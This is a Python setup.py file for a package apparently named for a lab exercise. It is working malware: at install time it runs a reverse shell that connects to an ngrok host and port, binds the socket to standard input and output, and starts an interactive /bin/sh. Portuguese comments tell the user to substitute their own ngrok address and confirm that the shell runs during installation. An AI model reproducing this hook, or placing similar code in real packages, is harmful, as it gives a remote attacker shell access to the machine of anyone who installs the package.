# setup.py
from setuptools import setup, find_packages
import os
import socket
import subprocess

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("6.tcp.ngrok.io", 14283))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Executa a shell reversa durante a instalação
reverse_shell()

setup(
    name="artifact_lab_3_package_76a351f5",
    version="0.2.0",  # Versão atualizada
    packages=find_packages(),
    install_requires=[],
)

